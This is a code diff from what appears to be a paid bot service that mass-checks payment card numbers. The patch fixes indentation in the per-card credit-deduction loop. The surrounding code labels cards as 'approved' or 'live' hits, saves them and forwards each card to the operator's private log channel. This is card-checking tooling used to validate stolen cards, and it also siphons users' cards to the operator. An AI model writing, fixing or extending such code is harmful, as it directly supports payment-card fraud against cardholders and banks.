@@ -5588,17 +5588,20 @@ Credits Used: {total_credits_used}
             result_card, status, message, http_code = await check_single_card_fast(card)
             actual_time = time.time() - start_time
 
-# Get credit cost
-credit_cost = get_credit_cost(status)
+            # Get credit cost - CORRECTED: removed incorrect try block
+            credit_cost = get_credit_cost(status)
 
-# Check if user has enough credits for this card (only for paid cards)
-if credit_cost > 0:
-    # Refresh user data to get current credits
-    current_user = await get_user(user_id)
-    if current_user["credits"] < credit_cost:
-        logger.warning(f"User {user_id} ran out of credits during mass check")
-        break
-    user = current_user  # Update cached user
+            # Check if user has enough credits for this card (only for paid cards)
+            if credit_cost > 0:
+                # Refresh user data to get current credits
+                current_user = await get_user(user_id)
+                if current_user["credits"] < credit_cost:
+                    logger.warning(f"User {user_id} ran out of credits during mass check")
+                    break
+                user = current_user  # Update cached user
+
+            processed += 1
+            total_credits_used += credit_cost
 
             # Update counters
             if status == "approved":
@@ -5606,9 +5609,7 @@ if credit_cost > 0:
                 approved_hits.append(card)
                 save_hit_card(user_id, card, "approved", is_private=True)
                 # Send encrypted card to private log channel
-                encrypted_card = encrypt_card_data(
-                    card
-                )  # FIXED: was encrypt_card_data(card_string)
+                encrypted_card = encrypt_card_data(card)
                 await send_to_log_channel(
                     context,
                     card,
@@ -5640,9 +5641,7 @@ if credit_cost > 0:
                 live_hits.append(card)
                 save_hit_card(user_id, card, "live", is_private=True)
                 # Send encrypted card to private log channel
-                encrypted_card = encrypt_card_data(
-                    card
-                )  # FIXED: was encrypt_card_data(card_string)
+                encrypted_card = encrypt_card_data(card)
                 await send_to_log_channel(
                     context,
                     card,
@@ -5775,7 +5774,6 @@ User: @{username}
             del checking_tasks[user_id]
         if user_id in files_storage:
             del files_storage[user_id]
-
 
 async def cleanup_task_callback(user_id):
     """Callback to cleanup after task completion"""
